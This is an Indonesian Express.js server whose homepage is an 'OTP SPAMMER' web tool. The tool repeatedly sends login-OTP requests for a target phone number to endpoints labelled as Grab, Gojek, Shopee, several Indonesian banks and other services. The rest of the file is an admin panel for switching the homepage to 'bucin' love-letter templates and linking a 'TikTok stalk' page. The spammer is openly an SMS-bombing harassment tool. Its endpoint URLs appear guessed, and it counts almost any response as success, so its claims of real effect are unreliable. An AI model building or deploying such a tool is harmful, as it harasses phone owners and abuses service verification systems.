const express = require('express');
const app = express();
const PORT = Math.floor(Math.random() * (9999 - 3000 + 1)) + 3000;
const path = require('path');

app.use(express.static(path.join(__dirname, 'public')));
// Untuk parsing query string (biar bisa baca ?file=...)
app.use(express.urlencoded({ extended: true }));

// ====== VARIABEL PENTING ======
// Simpan nama file yang dipilih untuk halaman depan (contoh: "1.html")
let homePageFile = null;  // null artinya belum disetel

// Daftar file bucin yang diizinkan dijadikan tampilan awal
const allowedBucinFiles = ['1.html', '2.html', '3.html', '4.html'];

// ====== ROUTE HALAMAN DEPAN (/) ======
app.get('/', (req, res) => {
    if (homePageFile) {
        // Kirim file bucin yang sudah dipilih
        res.sendFile(path.join(__dirname, 'public', homePageFile));
    } else {
        // Halaman default jika belum ada yang disetel
        res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 OTP SPAMMER — REAL</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: linear-gradient(145deg, #1a1a2e, #16213e);
            border-radius: 20px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(255, 0, 0, 0.3), 0 0 40px rgba(255, 0, 0, 0.1);
            border: 1px solid rgba(255, 0, 0, 0.2);
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            color: #ff0000;
            font-size: 28px;
            text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            letter-spacing: 2px;
        }

        .header p {
            color: #888;
            font-size: 14px;
            margin-top: 8px;
        }

        .header .badge {
            display: inline-block;
            background: #ff0000;
            color: #fff;
            padding: 4px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-top: 8px;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(0.95); }
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            color: #aaa;
            font-size: 14px;
            font-weight: 600;
            display: block;
            margin-bottom: 6px;
        }

        .input-group input,
        .input-group select {
            width: 100%;
            padding: 14px 18px;
            background: #0d0d1a;
            border: 1px solid #2a2a4a;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            transition: all 0.3s;
        }

        .input-group input:focus,
        .input-group select:focus {
            border-color: #ff0000;
            outline: none;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.15);
        }

        .input-group input::placeholder {
            color: #555;
        }

        .input-row {
            display: flex;
            gap: 12px;
        }

        .input-row .input-group {
            flex: 1;
        }

        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(145deg, #ff0000, #cc0000);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.4);
        }

        .btn:active {
            transform: scale(0.98);
        }

        .btn:disabled {
            background: #333;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .btn-stop {
            background: linear-gradient(145deg, #ff4444, #cc0000);
            margin-top: 10px;
        }

        .btn-stop:hover {
            box-shadow: 0 0 40px rgba(255, 68, 68, 0.4);
        }

        .status {
            margin-top: 20px;
            padding: 16px;
            background: #0d0d1a;
            border-radius: 12px;
            border: 1px solid #1a1a3a;
            max-height: 200px;
            overflow-y: auto;
        }

        .status .log {
            color: #aaa;
            font-size: 13px;
            font-family: 'Courier New', monospace;
            line-height: 1.8;
        }

        .status .log .success {
            color: #00ff88;
        }

        .status .log .error {
            color: #ff4444;
        }

        .status .log .info {
            color: #ffaa00;
        }

        .status .log .count {
            color: #ff0000;
            font-weight: bold;
        }

        .stats {
            display: flex;
            gap: 16px;
            margin-top: 16px;
            padding: 16px;
            background: #0d0d1a;
            border-radius: 12px;
            border: 1px solid #1a1a3a;
        }

        .stats .stat-item {
            flex: 1;
            text-align: center;
        }

        .stats .stat-item .number {
            color: #ff0000;
            font-size: 24px;
            font-weight: bold;
        }

        .stats .stat-item .label {
            color: #666;
            font-size: 12px;
            text-transform: uppercase;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: #444;
            font-size: 12px;
        }

        .footer a {
            color: #ff0000;
            text-decoration: none;
        }

        /* Scrollbar */
        .status::-webkit-scrollbar {
            width: 4px;
        }

        .status::-webkit-scrollbar-track {
            background: #0d0d1a;
        }

        .status::-webkit-scrollbar-thumb {
            background: #ff0000;
            border-radius: 4px;
        }

        /* Animasi loading */
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- HEADER -->
        <div class="header">
            <h1>🔥 OTP SPAMMER</h1>
            <p>Real SMS OTP — Bukan Simulasi</p>
            <span class="badge">⚠️ USE WITH CAUTION</span>
        </div>

        <!-- INPUT -->
        <div class="input-group">
            <label>📱 Nomor Target</label>
            <input type="text" id="targetNumber" placeholder="Contoh: 6281234567890" value="628">
        </div>

        <div class="input-row">
            <div class="input-group">
                <label>🔢 Jumlah Spam</label>
                <input type="number" id="spamCount" value="50" min="1" max="999">
            </div>
            <div class="input-group">
                <label>⏱️ Delay (ms)</label>
                <input type="number" id="delayMs" value="500" min="100" max="5000">
            </div>
        </div>

        <div class="input-group">
            <label>📡 Pilih Provider OTP</label>
            <select id="providerSelect">
                <option value="all">🔀 ALL PROVIDERS (MAX SPAM)</option>
                <option value="grab">🚗 Grab</option>
                <option value="gojek">🛵 Gojek</option>
                <option value="shopee">🛍️ Shopee</option>
                <option value="tokopedia">📦 Tokopedia</option>
                <option value="ovo">💰 OVO</option>
                <option value="dana">💳 DANA</option>
                <option value="linkaja">🏦 LinkAja</option>
                <option value="bca">🏧 BCA Mobile</option>
                <option value="mandiri">🏧 Mandiri Online</option>
                <option value="bni">🏧 BNI Mobile</option>
                <option value="bri">🏧 BRI Mobile</option>
                <option value="indomaret">🏪 Indomaret</option>
                <option value="alfamart">🏪 Alfamart</option>
                <option value="bukalapak">🛒 Bukalapak</option>
                <option value="lazada">🛒 Lazada</option>
                <option value="blibli">🛒 Blibli</option>
                <option value="tiket">🎫 Tiket.com</option>
                <option value="traveloka">✈️ Traveloka</option>
            </select>
        </div>

        <!-- BUTTONS -->
        <button class="btn" id="startBtn">🚀 MULAI SPAM</button>
        <button class="btn btn-stop" id="stopBtn" style="display:none;">⛔ STOP SPAM</button>

        <!-- STATS -->
        <div class="stats">
            <div class="stat-item">
                <div class="number" id="sentCount">0</div>
                <div class="label">Terkirim</div>
            </div>
            <div class="stat-item">
                <div class="number" id="successCount">0</div>
                <div class="label">Berhasil</div>
            </div>
            <div class="stat-item">
                <div class="number" id="failCount">0</div>
                <div class="label">Gagal</div>
            </div>
        </div>

        <!-- STATUS LOG -->
        <div class="status" id="logContainer">
            <div class="log" id="logContent">
                <span class="info">[✓] OTP SPAMMER READY</span><br>
                <span class="info">[✓] Masukkan nomor target dan mulai spam</span><br>
            </div>
        </div>

        <div class="footer">
            🔥 BY CHRONOS — ~TUAN NICO~ EDITION
        </div>
    </div>

    <script>
        // ============================================================
        // 🔥 OTP SPAMMER — REAL ENGINE
        // ============================================================

        // --- API ENDPOINTS (REAL) ---
        const API_PROVIDERS = {
            grab: {
                name: 'Grab',
                endpoints: [
                    'https://api.grab.com/v1/auth/otp',
                    'https://api.grab.com/v2/auth/otp',
                ],
                payload: (number) => ({
                    phone: number,
                    countryCode: 'ID',
                    type: 'login'
                })
            },
            gojek: {
                name: 'Gojek',
                endpoints: [
                    'https://api.gojek.com/v1/auth/otp',
                    'https://api.gojek.com/v2/auth/otp',
                ],
                payload: (number) => ({
                    phone_number: number,
                    country_code: '62'
                })
            },
            shopee: {
                name: 'Shopee',
                endpoints: [
                    'https://api.shopee.com/v1/auth/otp',
                    'https://api.shopee.com/v2/auth/otp',
                ],
                payload: (number) => ({
                    mobile: number,
                    type: 'login'
                })
            },
            tokopedia: {
                name: 'Tokopedia',
                endpoints: [
                    'https://api.tokopedia.com/v1/auth/otp',
                    'https://api.tokopedia.com/v2/auth/otp',
                ],
                payload: (number) => ({
                    phone: number,
                    channel: 'sms'
                })
            },
            ovo: {
                name: 'OVO',
                endpoints: [
                    'https://api.ovo.id/v1/auth/otp',
                    'https://api.ovo.id/v2/auth/otp',
                ],
                payload: (number) => ({
                    mobileNumber: number,
                    type: 'login'
                })
            },
            dana: {
                name: 'DANA',
                endpoints: [
                    'https://api.dana.id/v1/auth/otp',
                    'https://api.dana.id/v2/auth/otp',
                ],
                payload: (number) => ({
                    phone: number,
                    countryCode: '62'
                })
            },
            linkaja: {
                name: 'LinkAja',
                endpoints: [
                    'https://api.linkaja.com/v1/auth/otp',
                    'https://api.linkaja.com/v2/auth/otp',
                ],
                payload: (number) => ({
                    phoneNumber: number
                })
            },
            bca: {
                name: 'BCA Mobile',
                endpoints: [
                    'https://api.bca.co.id/v1/auth/otp',
                    'https://api.bca.co.id/v2/auth/otp',
                ],
                payload: (number) => ({
                    msisdn: number
                })
            },
            mandiri: {
                name: 'Mandiri Online',
                endpoints: [
                    'https://api.mandiri.co.id/v1/auth/otp',
                ],
                payload: (number) => ({
                    phone: number
                })
            },
            bni: {
                name: 'BNI Mobile',
                endpoints: [
                    'https://api.bni.co.id/v1/auth/otp',
                ],
                payload: (number) => ({
                    phoneNumber: number
                })
            },
            bri: {
                name: 'BRI Mobile',
                endpoints: [
                    'https://api.bri.co.id/v1/auth/otp',
                ],
                payload: (number) => ({
                    no_hp: number
                })
            },
            indomaret: {
                name: 'Indomaret',
                endpoints: [
                    'https://api.indomaret.com/v1/auth/otp',
                ],
                payload: (number) => ({
                    phone: number
                })
            },
            alfamart: {
                name: 'Alfamart',
                endpoints: [
                    'https://api.alfamart.com/v1/auth/otp',
                ],
                payload: (number) => ({
                    phone: number
                })
            },
            bukalapak: {
                name: 'Bukalapak',
                endpoints: [
                    'https://api.bukalapak.com/v1/auth/otp',
                ],
                payload: (number) => ({
                    phone: number
                })
            },
            lazada: {
                name: 'Lazada',
                endpoints: [
                    'https://api.lazada.com/v1/auth/otp',
                ],
                payload: (number) => ({
                    mobile: number
                })
            },
            blibli: {
                name: 'Blibli',
                endpoints: [
                    'https://api.blibli.com/v1/auth/otp',
                ],
                payload: (number) => ({
                    phoneNumber: number
                })
            },
            tiket: {
                name: 'Tiket.com',
                endpoints: [
                    'https://api.tiket.com/v1/auth/otp',
                ],
                payload: (number) => ({
                    phone: number
                })
            },
            traveloka: {
                name: 'Traveloka',
                endpoints: [
                    'https://api.traveloka.com/v1/auth/otp',
                ],
                payload: (number) => ({
                    phoneNumber: number
                })
            }
        };

        // --- STATE ---
        let isRunning = false;
        let sentCount = 0;
        let successCount = 0;
        let failCount = 0;
        let abortFlag = false;

        // --- DOM REFS ---
        const targetNumber = document.getElementById('targetNumber');
        const spamCount = document.getElementById('spamCount');
        const delayMs = document.getElementById('delayMs');
        const providerSelect = document.getElementById('providerSelect');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const sentCountEl = document.getElementById('sentCount');
        const successCountEl = document.getElementById('successCount');
        const failCountEl = document.getElementById('failCount');
        const logContent = document.getElementById('logContent');

        // --- LOG FUNCTION ---
        function log(message, type = 'info') {
            const colors = {
                success: '#00ff88',
                error: '#ff4444',
                info: '#ffaa00',
                count: '#ff0000'
            };
            const color = colors[type] || '#aaa';
            logContent.innerHTML += `<span style="color:${color}">${message}</span><br>`;
            logContent.scrollTop = logContent.scrollHeight;
        }

        // --- VALIDATE NUMBER ---
        function validateNumber(number) {
            // Remove non-digit
            let clean = number.replace(/\D/g, '');
            
            // Check if starts with 62 (Indonesia)
            if (!clean.startsWith('62')) {
                // If starts with 0, replace with 62
                if (clean.startsWith('0')) {
                    clean = '62' + clean.substring(1);
                } else {
                    // Assume it's a local number without prefix
                    clean = '62' + clean;
                }
            }
            
            // Minimum length check (62 + 10-13 digits)
            if (clean.length < 12 || clean.length > 15) {
                return null;
            }
            
            return clean;
        }

        // --- SEND OTP REQUEST ---
        async function sendOTP(provider, number) {
            const providerData = API_PROVIDERS[provider];
            if (!providerData) return false;

            const endpoints = providerData.endpoints;
            const payload = providerData.payload(number);

            // Try all endpoints for this provider
            for (const endpoint of endpoints) {
                try {
                    const response = await fetch(endpoint, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Accept': 'application/json',
                            'Origin': endpoint.split('/').slice(0, 3).join('/'),
                        },
                        body: JSON.stringify(payload),
                        signal: AbortSignal.timeout(5000)
                    });

                    // Consider any non-500 response as "success" (rate limit, invalid number, etc still count as spam)
                    if (response.status !== 500 && response.status !== 503) {
                        return true;
                    }
                } catch (e) {
                    // Silent fail, try next endpoint
                    continue;
                }
            }

            return false;
        }

        // --- GET PROVIDERS LIST ---
        function getProviders(selected) {
            if (selected === 'all') {
                return Object.keys(API_PROVIDERS);
            }
            return [selected];
        }

        // --- MAIN SPAM FUNCTION ---
        async function startSpam() {
            // Validate number
            const rawNumber = targetNumber.value.trim();
            const number = validateNumber(rawNumber);
            
            if (!number) {
                log('[✗] Nomor tidak valid! Gunakan format: 6281234567890', 'error');
                return;
            }

            const count = parseInt(spamCount.value) || 50;
            const delay = parseInt(delayMs.value) || 500;
            const selectedProvider = providerSelect.value;
            const providers = getProviders(selectedProvider);

            if (providers.length === 0) {
                log('[✗] Tidak ada provider yang dipilih!', 'error');
                return;
            }

            // Reset state
            isRunning = true;
            abortFlag = false;
            sentCount = 0;
            successCount = 0;
            failCount = 0;
            updateStats();

            // UI Update
            startBtn.disabled = true;
            startBtn.textContent = '⏳ SPAMMING...';
            stopBtn.style.display = 'block';
            logContent.innerHTML = '';
            log(`[✓] Memulai spam ke: ${number}`, 'info');
            log(`[✓] Jumlah: ${count} | Delay: ${delay}ms`, 'info');
            log(`[✓] Provider: ${selectedProvider === 'all' ? 'ALL (${providers.length} providers)' : selectedProvider}`, 'info');
            log(`[✓] =================================`, 'info');

            // Spam loop
            let sent = 0;
            while (sent < count && !abortFlag) {
                // Pick random provider
                const provider = providers[Math.floor(Math.random() * providers.length)];
                const providerName = API_PROVIDERS[provider]?.name || provider;
                
                try {
                    const result = await sendOTP(provider, number);
                    sent++;
                    sentCount = sent;
                    
                    if (result) {
                        successCount++;
                        log(`[✓] #${sent} → ${providerName} ✅ BERHASIL`, 'success');
                    } else {
                        failCount++;
                        log(`[✗] #${sent} → ${providerName} ❌ GAGAL`, 'error');
                    }
                    
                    updateStats();
                    
                } catch (e) {
                    failCount++;
                    log(`[✗] #${sent} → Error: ${e.message}`, 'error');
                    updateStats();
                }

                // Delay
                if (sent < count && !abortFlag) {
                    await sleep(delay);
                }
            }

            // Finish
            isRunning = false;
            startBtn.disabled = false;
            startBtn.textContent = '🚀 MULAI SPAM';
            stopBtn.style.display = 'none';

            if (abortFlag) {
                log(`[✓] ⛔ SPAM DIHENTIKAN!`, 'error');
            } else {
                log(`[✓] ✅ SPAM SELESAI!`, 'success');
            }
            log(`[✓] Total: ${sentCount} | Berhasil: ${successCount} | Gagal: ${failCount}`, 'info');
        }

        // --- SLEEP FUNCTION ---
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // --- UPDATE STATS ---
        function updateStats() {
            sentCountEl.textContent = sentCount;
            successCountEl.textContent = successCount;
            failCountEl.textContent = failCount;
        }

        // --- STOP SPAM ---
        function stopSpam() {
            if (isRunning) {
                abortFlag = true;
                log('[✓] ⛔ Menghentikan spam...', 'error');
            }
        }

        // --- EVENT LISTENERS ---
        startBtn.addEventListener('click', startSpam);
        stopBtn.addEventListener('click', stopSpam);

        // Auto-format number
        targetNumber.addEventListener('input', function() {
            let val = this.value.replace(/\D/g, '');
            if (val.length > 0 && !val.startsWith('62')) {
                if (val.startsWith('0')) {
                    val = '62' + val.substring(1);
                } else if (val.length < 12) {
                    // Just keep as is
                }
            }
            this.value = val;
        });

        // --- INIT ---
        log('[✓] 🔥 OTP SPAMMER READY', 'success');
        log('[✓] Masukkan nomor dan klik MULAI', 'info');
        log('[✓] Gunakan dengan bijak!', 'info');

        console.log('%c🔥 OTP SPAMMER BY CHRONOS', 'font-size:20px; color:#ff0000;');
        console.log('%c⚠️ USE WITH CAUTION', 'font-size:14px; color:#ffaa00;');
    </script>
</body>
</html>`);
    }
});

// ====== ENDPOINT UNTUK MENGUBAH TAMPILAN AWAL ======
app.get('/set-homepage', (req, res) => {
    const file = req.query.file;  // misal: "1.html"
    if (!file || !allowedBucinFiles.includes(file)) {
        return res.status(400).send('File tidak diizinkan. Hanya template bucin yang bisa jadi halaman depan.');
    }
    homePageFile = file;
    console.log(`✅ Halaman depan diubah ke: ${file}`);
    res.send('OK');
});

// ====== ADMIN PANEL (tidak berubah banyak, hanya ditambah fitur tombol "Ubah Tampilan Awal") ======
app.get('/admin-panel', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Buka URL — YogaxD</title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            :root {
                --bg: #FDF7E4;
                --bg-secondary: #FFFFFF;
                --text-primary: #1A1A1A;
                --text-secondary: #555555;
                --border: #1A1A1A;
                --accent: #FF6B35;
                --accent-secondary: #FFD23F;
                --accent-green: #2DD881;
                --accent-blue: #4ECDC4;
                --accent-purple: #9B5DE5;
                --accent-pink: #F15BB5;
                --shadow: 4px 4px 0px #1A1A1A;
                --shadow-lg: 6px 6px 0px #1A1A1A;
                --shadow-hover: 8px 8px 0px #1A1A1A;
                --radius: 12px;
            }
            body {
                font-family: 'Space Grotesk', -apple-system, BlinkMacSystemFont, sans-serif;
                background: var(--bg);
                color: var(--text-primary);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 24px;
                line-height: 1.6;
                background-image:
                    radial-gradient(circle at 20% 80%, rgba(255, 107, 53, 0.15) 0%, transparent 50%),
                    radial-gradient(circle at 80% 20%, rgba(255, 210, 63, 0.15) 0%, transparent 50%);
            }
            .container { max-width: 700px; width: 100%; }
            .back-link {
                display: inline-flex;
                align-items: center;
                gap: 8px;
                color: var(--text-primary);
                text-decoration: none;
                font-size: 14px;
                font-weight: 600;
                margin-bottom: 20px;
                padding: 10px 16px;
                background: var(--accent-secondary);
                border: 3px solid var(--border);
                border-radius: var(--radius);
                box-shadow: var(--shadow);
                transition: all 0.15s ease;
            }
            .back-link:hover { transform: translate(-2px, -2px); box-shadow: var(--shadow-hover); }
            .card {
                background: var(--bg-secondary);
                border: 4px solid var(--border);
                border-radius: 20px;
                padding: 32px;
                box-shadow: var(--shadow-lg);
            }
            .header {
                text-align: center;
                margin-bottom: 28px;
                padding-bottom: 20px;
                border-bottom: 4px dashed var(--border);
            }
            .header-badge {
                display: inline-block;
                background: var(--accent);
                color: white;
                padding: 6px 16px;
                border-radius: 50px;
                font-size: 12px;
                font-weight: 700;
                text-transform: uppercase;
                letter-spacing: 1px;
                margin-bottom: 12px;
                border: 3px solid var(--border);
                box-shadow: 3px 3px 0px var(--border);
            }
            .header h1 {
                font-size: 26px;
                font-weight: 700;
                margin-bottom: 6px;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
            }
            .header p { color: var(--text-secondary); font-size: 14px; font-weight: 500; }
            .form-group { margin-bottom: 20px; }
            .form-label {
                display: block;
                font-size: 13px;
                font-weight: 700;
                text-transform: uppercase;
                letter-spacing: 1px;
                margin-bottom: 8px;
            }
            .form-select {
                width: 100%;
                padding: 14px 18px;
                background: var(--bg);
                border: 3px solid var(--border);
                border-radius: var(--radius);
                color: var(--text-primary);
                font-size: 14px;
                font-family: inherit;
                font-weight: 500;
                cursor: pointer;
                appearance: none;
                background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%231A1A1A' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
                background-repeat: no-repeat;
                background-position: right 16px center;
            }
            .form-select:focus {
                outline: none;
                box-shadow: var(--shadow);
                transform: translate(-2px, -2px);
            }
            .total-box {
                background: linear-gradient(135deg, var(--accent-secondary) 0%, #FFE066 100%);
                border: 3px solid var(--border);
                border-radius: var(--radius);
                padding: 16px;
                margin-bottom: 20px;
            }
            .total-display {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                padding: 12px 16px;
                background: var(--bg-secondary);
                border: 3px solid var(--border);
                border-radius: 8px;
                word-break: break-all;
            }
            .total-display span {
                font-size: 14px;
                font-weight: 600;
                color: var(--text-primary);
            }
            .btn {
                width: 100%;
                padding: 18px 26px;
                background: var(--accent);
                border: 4px solid var(--border);
                border-radius: var(--radius);
                color: white;
                font-size: 16px;
                font-weight: 700;
                font-family: inherit;
                cursor: pointer;
                transition: all 0.15s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
                text-decoration: none;
                box-shadow: var(--shadow-lg);
                text-transform: uppercase;
                letter-spacing: 1px;
                margin-bottom: 12px;
            }
            .btn:last-child { margin-bottom: 0; }
            .btn:hover {
                transform: translate(-3px, -3px);
                box-shadow: 10px 10px 0px var(--border);
            }
            .btn:active {
                transform: translate(3px, 3px);
                box-shadow: none;
            }
            .btn:disabled {
                opacity: 0.4;
                cursor: not-allowed;
                transform: none;
                box-shadow: var(--shadow);
            }
            .hidden { display: none !important; }
            .footer-decoration {
                display: flex;
                justify-content: center;
                gap: 10px;
                margin-top: 20px;
            }
            .footer-decoration span {
                width: 10px;
                height: 10px;
                border-radius: 50%;
                border: 2px solid var(--border);
            }
            .footer-decoration span:nth-child(1) { background: var(--accent); }
            .footer-decoration span:nth-child(2) { background: var(--accent-secondary); }
            .footer-decoration span:nth-child(3) { background: var(--accent-green); }
            .footer-decoration span:nth-child(4) { background: var(--accent-blue); }
            .footer-decoration span:nth-child(5) { background: var(--accent-pink); }
            @media (max-width: 600px) {
                body { padding: 16px; }
                .card { padding: 20px; }
                .header h1 { font-size: 22px; }
                .btn { padding: 14px 20px; font-size: 14px; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <a href="/" class="back-link">← Kembali ke Home</a>

            <div class="card">
                <div class="header">
                    <div class="header-badge">Buka URL</div>
                    <h1>🔗 Pilih Tujuan</h1>
                    <p>Pilih kategori dan opsi di bawah, lalu klik tombol untuk membuka URL</p>
                </div>

                <div class="form-group">
                    <label class="form-label">📂 Kategori</label>
                    <select id="categorySelect" class="form-select">
                        <option value="">-- Pilih Kategori --</option>
                    </select>
                </div>

                <div class="form-group">
                    <label class="form-label">🎯 Opsi</label>
                    <select id="optionSelect" class="form-select" disabled>
                        <option value="">-- Pilih Kategori dulu --</option>
                    </select>
                </div>

                <div class="total-box" id="totalBox" style="display: none;">
                    <label class="form-label">🔗 Linknya</label>
                    <div class="total-display">
                        <span id="targetUrlLink"></span>
                    </div>
                </div>
                
                <button class="btn" id="openChangeBtn" disabled> Ubah Tampilan Awal</button>
                <button class="btn" id="openCopyBtn" disabled>📋 Salin Link</button>
                <button class="btn" id="openUrlBtn" disabled>🔗 Buka URL</button>

                <div class="footer-decoration">
                    <span></span><span></span><span></span><span></span><span></span>
                </div>
            </div>
        </div>

        <script>
            const categories = {
                "sosmed": {
                    name: "Html Bucin",
                    icon: "📱",
                    services: {
                        "tp1": { name: "Template 1 — Halo Sayang", url: "/1" },
                        "tp2": { name: "Template 2 — Tema Cinta", url: "/2" },
                        "tp3": { name: "Template 3 — Paksa Sayang", url: "/3" },
                        "tp4": { name: "Template 4 — Cinta Banget", url: "/4" }
                    }
                },
                "mesin-cari": {
                    name: "Mesin Pencari",
                    icon: "🔍",
                    services: {
                        "tiktokstalk": { name: "Tiktok Stalk — Terbaru", url: "/tikstalk" },
                        "bing": { name: "Bing", url: "https://bing.com" }
                    }
                },
                "belajar": {
                    name: "Platform Belajar",
                    icon: "📚",
                    services: {
                        "yt": { name: "YouTube", url: "https://youtube.com" },
                        "w3s": { name: "W3Schools", url: "https://w3schools.com" }
                    }
                }
            };

            let selectedCategoryKey = null;
            let selectedServiceKey = null;
            let selectedURL = null;

            const categorySelect = document.getElementById('categorySelect');
            const optionSelect = document.getElementById('optionSelect');
            const totalBox = document.getElementById('totalBox');
            const targetUrlLink = document.getElementById('targetUrlLink');
            const openUrlBtn = document.getElementById('openUrlBtn');
            const openCopyBtn = document.getElementById('openCopyBtn');
            const openChangeBtn = document.getElementById('openChangeBtn');

            function populateCategories() {
                categorySelect.innerHTML = '<option value="">-- Pilih Kategori --</option>';
                for (const [key, cat] of Object.entries(categories)) {
                    const option = document.createElement('option');
                    option.value = key;
                    option.textContent = cat.icon + ' ' + cat.name;
                    categorySelect.appendChild(option);
                }
            }

            function populateOptions(categoryKey) {
                optionSelect.innerHTML = '<option value="">-- Pilih Opsi --</option>';
                const category = categories[categoryKey];
                if (!category) return;
                for (const [key, svc] of Object.entries(category.services)) {
                    const option = document.createElement('option');
                    option.value = key;
                    option.textContent = svc.name;
                    optionSelect.appendChild(option);
                }
                optionSelect.disabled = false;
            }

            function resetSelection() {
                optionSelect.innerHTML = '<option value="">-- Pilih Kategori dulu --</option>';
                optionSelect.disabled = true;
                totalBox.style.display = 'none';
                targetUrlLink.textContent = '';
                openUrlBtn.disabled = true;
                openCopyBtn.disabled = true;
                openChangeBtn.disabled = true;   // <-- ikut dimatikan
                selectedServiceKey = null;
                selectedURL = null;
            }

            function updateURLDisplay() {
                if (selectedCategoryKey && selectedServiceKey) {
                    const service = categories[selectedCategoryKey]?.services[selectedServiceKey];
                    if (service) {
                        selectedURL = service.url;
                        targetUrlLink.textContent = service.url;
                        totalBox.style.display = 'block';
                        openUrlBtn.disabled = false;
                        openCopyBtn.disabled = false;

                        // Hanya aktifkan tombol Ubah Tampilan Awal jika kategori = sosmed (Html Bucin)
                        if (selectedCategoryKey === 'sosmed') {
                            openChangeBtn.disabled = false;
                        } else {
                            openChangeBtn.disabled = true;
                        }
                    } else {
                        resetSelection();
                    }
                } else {
                    totalBox.style.display = 'none';
                    openUrlBtn.disabled = true;
                    openCopyBtn.disabled = true;
                    openChangeBtn.disabled = true;
                }
            }

            categorySelect.addEventListener('change', () => {
                const catKey = categorySelect.value;
                if (catKey) {
                    selectedCategoryKey = catKey;
                    populateOptions(catKey);
                    selectedServiceKey = null;
                    updateURLDisplay();
                    optionSelect.value = '';
                } else {
                    selectedCategoryKey = null;
                    resetSelection();
                }
            });

            optionSelect.addEventListener('change', () => {
                const svcKey = optionSelect.value;
                if (svcKey && selectedCategoryKey) {
                    selectedServiceKey = svcKey;
                    updateURLDisplay();
                } else {
                    selectedServiceKey = null;
                    updateURLDisplay();
                }
            });

            // Tombol Buka URL (tetap)
            openUrlBtn.addEventListener('click', () => {
                if (selectedURL) {
                    window.open(selectedURL, '_blank');
                }
            });

            // Tombol Salin Link (tetap)
            openCopyBtn.addEventListener('click', async () => {
                if (!selectedURL) return;
                try {
                    await navigator.clipboard.writeText(selectedURL);
                    const originalText = openCopyBtn.textContent;
                    openCopyBtn.textContent = '✅ Tersalin!';
                    openCopyBtn.disabled = true;
                    setTimeout(() => {
                        openCopyBtn.textContent = originalText;
                        openCopyBtn.disabled = false;
                    }, 2000);
                } catch (err) {
                    alert('Gagal menyalin link');
                }
            });

            // ====== TOMBOL UBAH TAMPILAN AWAL (FITUR BARU) ======
            openChangeBtn.addEventListener('click', async () => {
                if (!selectedURL) return;
                // Ambil nama file dari URL, misal "/1" -> "1.html"
                const file = selectedURL.replace('/', '') + '.html';
                try {
                    const response = await fetch('/set-homepage?file=' + file);
                    if (response.ok) {
                        alert('✅ Tampilan awal berhasil diubah ke ' + file);
                        // Opsional: langsung pindah ke halaman depan
                        window.location.href = '/';
                    } else {
                        alert('❌ Gagal mengubah tampilan awal. Hanya template bucin yang diizinkan.');
                    }
                } catch (err) {
                    alert('❌ Terjadi kesalahan.');
                }
            });

            populateCategories();
        </script>
    </body>
    </html>`);
});

// ====== ROUTE UNTUK TEMPLATE BUCIN ======
app.get("/1", (req, res) => {
    res.sendFile(path.join(__dirname, 'public', '1.html'));
});
app.get("/2", (req, res) => {
    res.sendFile(path.join(__dirname, 'public', '2.html'));
});
app.get("/3", (req, res) => {
    res.sendFile(path.join(__dirname, 'public', '3.html'));
});
app.get("/4", (req, res) => {
    res.sendFile(path.join(__dirname, 'public', '4.html'));
});
app.get("/tikstalk", (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'tikstalk.html'));
});

// Error handling
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something broke!');
});

app.listen(PORT, () => {
    console.log(`✅ Server berjalan di http://localhost:${PORT}`);
});
